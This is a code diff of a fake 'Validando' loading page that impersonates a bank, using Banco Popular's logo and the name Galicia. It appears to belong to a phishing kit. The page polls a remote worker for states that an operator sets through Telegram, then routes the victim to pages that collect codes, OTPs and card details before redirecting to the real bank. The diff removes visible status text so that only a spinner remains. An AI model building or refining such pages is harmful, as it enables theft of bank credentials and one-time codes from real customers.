@@ -5,74 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
   <title>Validando - Galicia</title>
   
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
   <style>
-    /* RESET Y BASE */
+    /* RESET */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
-      -webkit-tap-highlight-color: transparent;
-      -webkit-font-smoothing: antialiased;
     }
 
     body {
-      background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
-      color: #000;
+      background: #ffffff;
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
-      padding: 20px;
-      position: relative;
-      overflow-x: hidden;
-    }
-
-    /* FONDO DECORATIVO */
-    .background-pattern {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: 
-        radial-gradient(circle at 10% 20%, rgba(244, 119, 33, 0.05) 0%, transparent 20%),
-        radial-gradient(circle at 90% 80%, rgba(244, 119, 33, 0.05) 0%, transparent 20%);
-      z-index: -1;
-    }
-
-    /* Contenedor principal */
-    .loading-container {
-      width: 100%;
-      max-width: 400px;
-      background: white;
-      border-radius: 24px;
-      padding: 50px 35px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
-      border: 1px solid rgba(0, 0, 0, 0.05);
-      text-align: center;
-      animation: fadeIn 0.8s ease-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Logo */
-    .logo {
-      text-align: center;
-      margin-bottom: 40px;
-    }
-
-    .logo img {
-      width: 180px;
-      height: auto;
-      filter: brightness(1.1);
     }
 
     /* ============================================
@@ -80,9 +26,8 @@
     ============================================ */
     .spinner-salmon {
       position: relative;
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 30px;
+      width: 60px;
+      height: 60px;
     }
 
     .spinner-salmon::before {
@@ -115,192 +60,15 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* Icono dentro del círculo */
+    /* Icono dentro del círculo (opcional) */
     .spinner-salmon .icon {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
       color: #f47721;
-      font-size: 28px;
+      font-size: 22px;
       z-index: 1;
-    }
-
-    /* Títulos */
-    .loading-title {
-      font-size: 24px;
-      font-weight: 700;
-      margin-bottom: 12px;
-      color: #333;
-    }
-
-    .loading-subtitle {
-      font-size: 15px;
-      color: #666;
-      line-height: 1.6;
-      margin-bottom: 8px;
-    }
-
-    .loading-subtitle:last-of-type {
-      margin-bottom: 0;
-    }
-
-    /* ID de transacción */
-    .transaction-id {
-      margin-top: 20px;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-      color: #999;
-      word-break: break-all;
-      background: #f5f5f5;
-      padding: 10px 14px;
-      border-radius: 8px;
-    }
-
-    /* Estado */
-    .transaction-status {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #f47721;
-      font-weight: 500;
-      padding: 10px;
-      background: rgba(244, 119, 33, 0.08);
-      border-radius: 8px;
-    }
-
-    /* Footer */
-    .footer {
-      margin-top: 35px;
-      font-size: 11px;
-      color: #888;
-      text-align: center;
-      line-height: 1.6;
-      padding-top: 15px;
-      border-top: 1px solid rgba(0, 0, 0, 0.08);
-    }
-
-    .footer strong {
-      color: #f47721;
-      font-weight: 700;
-    }
-
-    /* ===========================
-        MEDIA QUERIES RESPONSIVE
-    =========================== */
-
-    @media (max-width: 480px) {
-      body {
-        padding: 15px;
-        background: white;
-      }
-      
-      .background-pattern {
-        display: none;
-      }
-      
-      .loading-container {
-        padding: 30px 20px;
-        border-radius: 16px;
-        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
-        border: none;
-      }
-      
-      .logo img {
-        width: 150px;
-      }
-      
-      .spinner-salmon {
-        width: 70px;
-        height: 70px;
-      }
-      
-      .spinner-salmon .icon {
-        font-size: 24px;
-      }
-      
-      .loading-title {
-        font-size: 20px;
-      }
-      
-      .loading-subtitle {
-        font-size: 14px;
-      }
-
-      @supports (padding: max(0px)) {
-        body {
-          padding: max(15px, env(safe-area-inset-top)) 
-                   max(15px, env(safe-area-inset-right)) 
-                   max(15px, env(safe-area-inset-bottom)) 
-                   max(15px, env(safe-area-inset-left));
-        }
-      }
-    }
-
-    @media (max-height: 600px) {
-      .loading-container {
-        padding: 25px 20px;
-      }
-      
-      .logo {
-        margin-bottom: 25px;
-      }
-      
-      .logo img {
-        width: 130px;
-      }
-      
-      .spinner-salmon {
-        width: 60px;
-        height: 60px;
-        margin-bottom: 20px;
-      }
-      
-      .spinner-salmon .icon {
-        font-size: 20px;
-      }
-      
-      .loading-title {
-        font-size: 18px;
-        margin-bottom: 8px;
-      }
-      
-      .loading-subtitle {
-        font-size: 13px;
-      }
-    }
-
-    @media (prefers-color-scheme: dark) {
-      body {
-        background: #121212;
-        color: #ffffff;
-      }
-      
-      .loading-container {
-        background: #1e1e1e;
-        border-color: #333;
-      }
-      
-      .loading-title {
-        color: #ffffff;
-      }
-      
-      .loading-subtitle {
-        color: #bbb;
-      }
-      
-      .transaction-id {
-        background: #2d2d2d;
-        color: #aaa;
-      }
-      
-      .transaction-status {
-        background: rgba(244, 119, 33, 0.15);
-      }
-      
-      .footer {
-        color: #888;
-        border-top-color: #333;
-      }
     }
 
     @media (prefers-reduced-motion: reduce) {
@@ -311,42 +79,15 @@
   </style>
 </head>
 <body>
-  <!-- Fondo decorativo -->
-  <div class="background-pattern"></div>
-
-  <!-- Contenido principal -->
-  <div class="loading-container">
-    <!-- Logo -->
-    <div class="logo">
-      <img src="https://mi.bancopopular.com.co/assets/images/popularhorizontal_new.svg" 
-           alt="Galicia" 
-           loading="eager">
-    </div>
-
-    <!-- CÍRCULO DE CARGA SALMON -->
-    <div class="spinner-salmon">
-      <div class="icon">
-        <i class="fas fa-shield-alt"></i>
-      </div>
-    </div>
-
-    <!-- Títulos -->
-    <h1 class="loading-title">Validando tu información</h1>
-    
-    <p class="loading-subtitle">Estamos procesando tu solicitud</p>
-    <p class="loading-subtitle" id="statusMessage" style="color: #f47721; font-weight: 500;">⏳ Esperando autorización...</p>
-
-    <!-- ID de transacción -->
-    <div class="transaction-id" id="transactionId">Cargando...</div>
-
-    <!-- Estado -->
-    <div class="transaction-status" id="transactionStatus">● Conectando...</div>
-
-    <!-- Footer -->
-    <div class="footer">
-      <strong>Galicia</strong> - Tu seguridad es nuestra prioridad
+  <!-- SOLO CÍRCULO SALMON -->
+  <div class="spinner-salmon">
+    <div class="icon">
+      <i class="fas fa-shield-alt"></i>
     </div>
   </div>
+
+  <!-- Font Awesome para el ícono -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
   <script>
     // ========================= CONFIGURACIÓN =========================
@@ -360,8 +101,6 @@
       intentos++;
       
       try {
-        document.getElementById('transactionStatus').textContent = `⏳ Verificando... (${intentos}/${MAX_INTENTOS})`;
-        
         const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
         
         if (!response.ok) {
@@ -373,77 +112,61 @@
 
         // Si está pendiente, seguir esperando
         if (!data.estado || data.estado === "pendiente") {
-          document.getElementById('statusMessage').textContent = '⏳ Esperando autorización en Telegram...';
-          
           if (intentos >= MAX_INTENTOS) {
-            document.getElementById('statusMessage').textContent = '⏰ Tiempo de espera agotado';
-            document.getElementById('transactionStatus').textContent = '❌ Tiempo agotado';
+            console.log('⏰ Tiempo de espera agotado');
             return;
           }
-          
           setTimeout(() => checkStatus(transactionId), 10000);
           return;
         }
 
         // ========================= PROCESAR ESTADO =========================
         const estado = data.estado;
-        document.getElementById('transactionStatus').textContent = `✅ Estado: ${estado}`;
+        console.log(`✅ Estado recibido: ${estado}`);
         
         switch (estado) {
           case 'autorizado':
-            document.getElementById('statusMessage').textContent = '✅ ¡Autorización confirmada!';
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codigo.html`;
-            }, 1500);
+            }, 500);
             break;
             
           case 'error':
-            document.getElementById('statusMessage').textContent = '❌ Acceso denegado';
             setTimeout(() => {
               window.location.href = `${BASE_URL}/`;
-            }, 2000);
+            }, 500);
             break;
             
           case 'otp_solicitado':
-            document.getElementById('statusMessage').textContent = '📲 Esperando OTP...';
             setTimeout(() => checkStatus(transactionId), 10000);
             break;
             
           case 'otp_recibido':
-            document.getElementById('statusMessage').textContent = '✅ OTP verificado';
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codeinco.html`;
-            }, 1500);
+            }, 500);
             break;
             
           case 'fallo_biometria':
-            document.getElementById('statusMessage').textContent = '🔐 Verificando biometría...';
             setTimeout(() => {
               window.location.href = `${BASE_URL}/tarjeta.html`;
-            }, 1500);
+            }, 500);
             break;
             
           case 'finalizado':
-            document.getElementById('statusMessage').textContent = '🏁 Proceso finalizado';
             setTimeout(() => {
               window.location.href = 'https://www.bancopopular.com.co/';
-            }, 1500);
+            }, 500);
             break;
             
           default:
-            document.getElementById('statusMessage').textContent = `ℹ️ Estado: ${estado}`;
             setTimeout(() => checkStatus(transactionId), 10000);
         }
         
       } catch (error) {
         console.error('❌ Error:', error);
-        document.getElementById('transactionStatus').textContent = '❌ Error de conexión';
-        
         if (intentos < MAX_INTENTOS) {
-          document.getElementById('statusMessage').textContent = '⚠️ Reintentando...';
           setTimeout(() => checkStatus(transactionId), 5000);
-        } else {
-          document.getElementById('statusMessage').textContent = '❌ Error persistente. Recarga.';
         }
       }
     }
@@ -453,18 +176,14 @@
       const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
       
       if (!bancoldata || !bancoldata.transactionId) {
-        document.getElementById('statusMessage').textContent = '❌ Error: Datos no encontrados';
+        console.log('❌ Error: Datos no encontrados');
         setTimeout(() => {
           window.location.href = `${BASE_URL}/`;
-        }, 2000);
+        }, 1000);
         return;
       }
 
       const transactionId = bancoldata.transactionId;
-      
-      document.getElementById('transactionId').textContent = `🆔 ${transactionId}`;
-      document.getElementById('transactionStatus').textContent = '⏳ Verificando...';
-      
       console.log('🔍 Verificando transacción:', transactionId);
 
       await checkStatus(transactionId);
